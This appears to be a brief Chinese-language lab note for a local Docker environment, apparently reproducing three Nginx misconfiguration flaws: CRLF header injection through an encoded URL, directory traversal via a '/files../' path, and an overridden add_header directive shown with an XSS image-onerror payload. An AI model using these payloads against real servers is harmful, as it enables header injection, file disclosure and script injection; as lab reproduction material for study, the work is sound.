有三个漏洞：

打开环境：
```
docker compose up -d
```
# 1.CRLF注入漏洞
访问页面：
```
`http://localhost:18080/%0d%0aSet-Cookie:%20a=1`
```
会重定向到
其他页面

# 2.目录穿越漏洞
访问页面：
```
http://localhost:8081/files../
```

# 3.add_header被覆盖
/test2的localtion添加了`X-Content-Type_Options`头
导致夫块中的`add_header`全部失效：
```
http://localhost:8082/test2# <img src=1 onerror=alert(1)>
```
